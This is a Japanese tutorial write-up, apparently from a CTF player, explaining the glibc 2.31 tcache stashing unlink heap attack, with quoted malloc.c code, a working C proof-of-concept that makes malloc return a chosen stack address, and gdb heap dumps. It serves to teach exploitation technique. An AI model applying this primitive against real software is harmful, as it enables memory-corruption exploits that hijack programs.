---
tags: pwn
---

これまでに解いた問題: https://hackmd.io/@Xornet/BkemeSAhU

# tcache stashing unlink attack

## まえがき

先日のTSG CTFでsmallbinからtcacheに入る際の挙動を利用した問題が出ました([TSG CTF 2020 - Karte](/@Xornet/B1jjb66yv)。該当Writeupでもちょっとだけ説明していますが、glibcのコードを交えた説明はしていないので今回は問題を解く代わりにこれの解説をしようと思います
ちなみに記事名はhow2heapの同名の解説から取りました。やっていることはHouse of Loreに近いような気がします。

## Outline

* libc: 2.31で動くことを確認
* 出来ること: 任意アドレスをtcacheの先頭に持ってくることが出来る
* 制限: 
    * smallbinに入るサイズのmallocとfreeが出来る
    * ↑のサイズより大きいサイズのmallocとfreeが出来る
    * free後にbk"だけ"を書き換えることが出来る、またはHeap Leak等を利用してfdを変更すること無くbkを書き換えることが出来る
    * tcacheに入れたいアドレスのQWORD後ろにSIGSEGVを起こさないアドレスを入れることが出来る

## smallbin -> tcache

glibcではtcacheを優先して使うため、もしtcacheが空の時にfastbinやsmallbinから取ろうとするとbin内の残りのチャンクをtcacheへ入れようとする動作が走る。ここではsmallbinからtcacheに入る挙動を利用する。

glibcの該当するコードは以下である

```c
/*
     If a small request, check regular bin.  Since these "smallbins"
     hold one size each, no searching within bins is necessary.
     (For a large request, we need to wait until unsorted chunks are
     processed to find best fit. But for small ones, fits are exact
     anyway, so we can check now, which is faster.)
   */
  if (in_smallbin_range (nb))
    {
      idx = smallbin_index (nb);
      bin = bin_at (av, idx);
      if ((victim = last (bin)) != bin)
        {
          bck = victim->bk;
          if (__glibc_unlikely (bck->fd != victim))
            malloc_printerr ("malloc(): smallbin double linked list corrupted");
          set_inuse_bit_at_offset (victim, nb);
          bin->bk = bck;
          bck->fd = bin;
          if (av != &main_arena)
            set_non_main_arena (victim);
          check_malloced_chunk (av, victim, nb);
#if USE_TCACHE
          /* While we're here, if we see other chunks of the same size,
             stash them in the tcache.  */
          size_t tc_idx = csize2tidx (nb);
          if (tcache && tc_idx < mp_.tcache_bins)
            {
              mchunkptr tc_victim;
              /* While bin not empty and tcache not full, copy chunks over.  */
              while (tcache->counts[tc_idx] < mp_.tcache_count
                     && (tc_victim = last (bin)) != bin)
                {
                  if (tc_victim != 0)
                    {
                      bck = tc_victim->bk;
                      set_inuse_bit_at_offset (tc_victim, nb);
                      if (av != &main_arena)
                        set_non_main_arena (tc_victim);
                      bin->bk = bck;
                      bck->fd = bin;
                      tcache_put (tc_victim, tc_idx);
                    }
                }
            }
#endif
          void *p = chunk2mem (victim);
          alloc_perturb (p, bytes);
          return p;
        }
    }
```

`#if USE_TCACHE`まではsmallbinからチャンクを取り出して後続のチャンクを先頭に繋げる動作である。重要なところだけ軽く説明する。

`if ((victim = last (bin)) != bin)`の部分はsmallbinにチャンクがあるかどうかを判定している。`main_arena`の`bins[size]`メンバではbinに繋がれているチャンクの先頭と末尾を登録しているが、空の場合は`bins[size]`自身のアドレスになる。
`last(bin)`はマクロが定義されていて`#define last(b) ((b)->bk)`と定義されている。`last(bin)`によって最も古いチャンクを取ってきており、それが自身であればそのbinは空であることを意味している

`if (__glibc_unlikely (bck->fd != victim))`の部分はリンクリストの正当性を検証している。`bck = victim->bk;`であることからこのif文では`victim->bk->fd != victim`かどうかを判定している。もしこれがTrueの場合、`victim->bk`で指定されているチャンクのfdが`victim`自身で無いことから狂ったリンクリストになっている。
このチェックがあることで単にbkを変えて任意アドレスをsmallbin内に用意するということは出来ない。

このチェックをすり抜けると無事にunlinkされる。
`bin->bk = bck;`と`bck->fd = bin;`によってsmallbinで次に取られるチャンクは`bck`になり、`bck`はsmallbinの端であるために`fd`に`bin`が設定される。

`#if USE_TCACHE`から`#endif`内で今回利用する挙動が発生している。

`while (tcache->counts[tc_idx] < mp_.tcache_count && (tc_victim = last (bin)) != bin)`の最初の条件は該当するtcacheのサイズが規定より少ないかをまず見ている、つまりtcacheに空きがあるかどうかである。後続の条件は先程smallbinの解説で述べた通りでsmallbinにチャンクがあるかどうかである。よってこのwhile文は"tcacheに空きがあってかつ、smallbinにチャンクがある"時に発生する。
やっていることは殆どunlinkと同じである。2点違う点を挙げるとすれば前述のunlink時にあった`victim->bk->fd != victim`のチェックが無いことと、最後に`tcache_put`が呼ばれていることである。
したがって、この動作はtcacheが埋まるか、smallbinが空になるまでsmallbinからチャンクを"チェック無しで"取り出し、tcacheへ入れている、ということになる。

また、smallbinがFIFOなのに対してtcacheはLIFOなのでsmallbinの先頭にあったチャンクはこの一連の動作で移されるチャンクの中では最も遅くtcacheから確保されることになる

## bkを書き換える

smallbinから移す際にチェックが発生しないことから移されるチャンクのbkを書き換えることで任意アドレスをtcacheに入れることが期待出来る。
何が起こっているのかを抽象的に説明する

```
~ tcache ~
(empty)
~ smallbin ~
(bin ->) A -> B -> C -> D -> E -> F -> G (-> bin)
```
このような、あるサイズのtcacheが空でsmallbinが7つ埋まっているという状況を考える。
`A -> B`は`A->bk == B`を意味する、したがって次にsmallbinから確保されるチャンクは`A`である
この状態で`G`の`bk`を書き換えると次のようになる

```
~ tcache ~
(empty)
~ smallbin ~
(bin ->) A -> B -> C -> D -> E -> F -> G -> x (-> y)
```
これで`x`がsmallbinに繋がれた。なお、`*x = y`であるとする。
この状態でsmallbinからチャンクが取られるようなmallocを発生させる。これで`A`が取得される。
それと同時にsmallbinからtcacheへチャンクが移される、その直前の様子が次である

```
~ tcache ~
(empty)
~ smallbin ~
(bin ->) B -> C -> D -> E -> F -> G -> x (-> y)
```
smallbinの先頭7つは`x`までである、よってこの直後に行われるsmallbinからtcacheへの移動は`x`までが入る(tcacheには7つまでしか入らない)
こうして次のような状態になる

```
~ tcache ~
x -> G -> F -> E -> D -> C -> B (-> null)
~ smallbin ~
(bin ->) y (xに入っていた値)
```
`B`から順に入っていくのでtcacheの先頭には`x`が来る。よって次のmallocで`x`をチャンクとして確保することが出来る。
なお、最後のunlinkで`y->fd = bin`となることから`y`にはSIGSEGVを起こさない意味で安全な値を入れておく必要がある

## PoC

libc 2.31で動くPoCを書いた

```c
#include <stdio.h>
#include <malloc.h>

#define ull unsigned long long

int main() {
    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stderr, NULL, _IONBF, 0);

    ull target[4];
    target[2] = 0xdeadbeefcafebabe;
    printf("[+] target -> %p: %llx\n", &target[2], target[2]);
    // tamper bk
    ull safe_bk[4];
    target[3] = &safe_bk;

    // make chunks
    ull *ps[14];

    for (int i = 0; i < 14; i++) {
        ps[i] = malloc(0x88);
    }

    // fill tcache
    for (int i = 1; i < 14; i += 2) {
        free(ps[i]);
    }

    // send to unsorted bin
    for (int i = 0; i < 14; i += 2) {
        free(ps[i]);
    }

    // send to small bin
    malloc(0x98);

    // empty tcache
    for (int i = 0; i < 7; i++) {
        malloc(0x88);
    }

    // change bk of tha first chunk of smallbin
    ps[12][1] = &target;

    // stashing unlink attack
    malloc(0x88);

    // get pointer to target
    ull *p = malloc(0x88);
    *p = 0x1145141919810931;

    printf("[+] target -> %p: %llx\n", &target[2], target[2]);
}
```

結果は次のようになり、無事に値が書き換わっていることがわかる

```
$ ./tcache_stashing_unlink_attack
[+] target -> 0x7fffced3ef00: deadbeefcafebabe
[+] target -> 0x7fffced3ef00: 1145141919810931
```

実際にgdbで覗いてどうなっているかを調べてみる。
tcacheを埋めた後に、unsorted binにチャンクを7つ入れるところまでは特に問題無い。

```
gdb-peda$ heapinfo
(0x20)     fastbin[0]: 0x0
(0x30)     fastbin[1]: 0x0
(0x40)     fastbin[2]: 0x0
(0x50)     fastbin[3]: 0x0
(0x60)     fastbin[4]: 0x0
(0x70)     fastbin[5]: 0x0
(0x80)     fastbin[6]: 0x0
(0x90)     fastbin[7]: 0x0
(0xa0)     fastbin[8]: 0x0
(0xb0)     fastbin[9]: 0x0
                  top: 0x8005a70 (size : 0x20590) 
       last_remainder: 0x0 (size : 0x0) 
            unsortbin: 0x8005950 (size : 0x90) <--> 0x8005830 (size : 0x90) <--> 0x8005710 (size : 0x90) <--> 0x80055f0 (size : 0x90) <--> 0x80054d0 (size : 0x90) <--> 0x80053b0 (size : 0x90) <--> 0x8005290 (size : 0x90)
(0x90)   tcache_entry[7](7): 0x80059f0 --> 0x80058d0 --> 0x80057b0 --> 0x8005690 --> 0x8005570 --> 0x8005450 --> 0x8005330
gdb-peda$ 
```

横に長くて見辛いが、tcacheにもunsorted binにも7つチャンクが繋がっている
ここで`malloc(0x98)`を発動させると次のようになる

```
gdb-peda$ heapinfo
(0x20)     fastbin[0]: 0x0
(0x30)     fastbin[1]: 0x0
(0x40)     fastbin[2]: 0x0
(0x50)     fastbin[3]: 0x0
(0x60)     fastbin[4]: 0x0
(0x70)     fastbin[5]: 0x0
(0x80)     fastbin[6]: 0x0
(0x90)     fastbin[7]: 0x0
(0xa0)     fastbin[8]: 0x0
(0xb0)     fastbin[9]: 0x0
                  top: 0x8005b10 (size : 0x204f0) 
       last_remainder: 0x0 (size : 0x0) 
            unsortbin: 0x0
(0x090)  smallbin[ 7]: 0x8005950  <--> 0x8005830  <--> 0x8005710  <--> 0x80055f0  <--> 0x80054d0  <--> 0x80053b0  <--> 0x8005290
(0x90)   tcache_entry[7](7): 0x80059f0 --> 0x80058d0 --> 0x80057b0 --> 0x8005690 --> 0x8005570 --> 0x8005450 --> 0x8005330
gdb-peda$ 
```

要求サイズを満たさなかったためUnsorted Binからsmallbinへチャンクが移動した。そのままmallocを繰り返してtcacheを空っぽにする

```
gdb-peda$ heapinfo
(0x20)     fastbin[0]: 0x0
(0x30)     fastbin[1]: 0x0
(0x40)     fastbin[2]: 0x0
(0x50)     fastbin[3]: 0x0
(0x60)     fastbin[4]: 0x0
(0x70)     fastbin[5]: 0x0
(0x80)     fastbin[6]: 0x0
(0x90)     fastbin[7]: 0x0
(0xa0)     fastbin[8]: 0x0
(0xb0)     fastbin[9]: 0x0
                  top: 0x8005b10 (size : 0x204f0) 
       last_remainder: 0x0 (size : 0x0) 
            unsortbin: 0x0
(0x090)  smallbin[ 7]: 0x8005950  <--> 0x8005830  <--> 0x8005710  <--> 0x80055f0  <--> 0x80054d0  <--> 0x80053b0  <--> 0x8005290
gdb-peda$ 
```

smallbinで1番最後に取られる`0x8005950`の`bk`を書き換えると次のようになる

```
gdb-peda$ heapinfo
(0x20)     fastbin[0]: 0x0
(0x30)     fastbin[1]: 0x0
(0x40)     fastbin[2]: 0x0
(0x50)     fastbin[3]: 0x0
(0x60)     fastbin[4]: 0x0
(0x70)     fastbin[5]: 0x0
(0x80)     fastbin[6]: 0x0
(0x90)     fastbin[7]: 0x0
(0xa0)     fastbin[8]: 0x0
(0xb0)     fastbin[9]: 0x0
                  top: 0x8005b10 (size : 0x204f0) 
       last_remainder: 0x0 (size : 0x0) 
            unsortbin: 0x0
(0x090)  smallbin[ 7]: 0x8005950 (doubly linked list corruption 0x8005950 != 0xdeadbeefcafebabe and 0x8005950 is broken)
gdb-peda$ 
```

bkを書き換えてしまい、リンクリストが正常では無くなっている。一応次の確保されるチャンクの前後はリンクリストとして正常なので`malloc(0x88)`を呼ぶと無事に確保される。
と、同時にtcacheへのチャンク移行が発生する、その様子が次のとおりである

```
gdb-peda$ heapinfo
(0x20)     fastbin[0]: 0x0
(0x30)     fastbin[1]: 0x0
(0x40)     fastbin[2]: 0x0
(0x50)     fastbin[3]: 0x0
(0x60)     fastbin[4]: 0x0
(0x70)     fastbin[5]: 0x0
(0x80)     fastbin[6]: 0x0
(0x90)     fastbin[7]: 0x0
(0xa0)     fastbin[8]: 0x0
(0xb0)     fastbin[9]: 0x0
                  top: 0x8005b10 (size : 0x204f0) 
       last_remainder: 0x0 (size : 0x0) 
            unsortbin: 0x0
(0x090)  smallbin[ 7]: 0x8005950 (doubly linked list corruption 0x8005950 != 0x0 and 0x8005950 is broken)
(0x90)   tcache_entry[7](7): 0x7ffffffedcf0 --> 0x8005960 --> 0x8005840 --> 0x8005720 --> 0x8005600 --> 0x80054e0 --> 0x80053c0
gdb-peda$ 
```

smallbinは壊れたままだが、tcacheに先程までsmallbinにあったチャンクが移されたことが分かる。
と、同時に書き換えたbkに対応するアドレスがtcacheの先頭に来ていることが分かる(PoC中の`&target[2]`に対応する)

こうして目標のアドレスをtcacheに先頭に持ってこれたのであとは確保するだけである。

## 参考文献

* [how2heap/tcache_stashing_unlink_attack.c](https://github.com/shellphish/how2heap/blob/master/glibc_2.26/tcache_stashing_unlink_attack.c): callocを呼んでtcacheを無視してsmallbinから取っているケース
* [malloc.c source code](https://code.woboq.org/userspace/glibc/malloc/malloc.c.html#3665): 原典